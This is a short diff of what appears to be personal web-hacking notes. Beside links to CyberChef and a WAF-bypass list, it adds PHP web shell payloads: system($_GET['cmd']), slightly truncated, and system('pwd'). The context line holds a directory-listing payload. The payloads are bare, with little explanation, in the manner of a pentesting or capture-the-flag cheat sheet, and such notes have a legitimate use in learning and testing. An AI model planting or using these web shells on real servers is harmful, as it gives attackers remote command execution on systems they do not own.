@@ -586,4 +586,10 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >[sheif ](https://cyberchef.io/)
 >
 >[github waf](https://github.com/0xInfection/Awesome-WAF)
+>
+>link to web
+```
+<?php system($_GET['cmd']);?
+<?php system('pwd'); ?>
+```
 
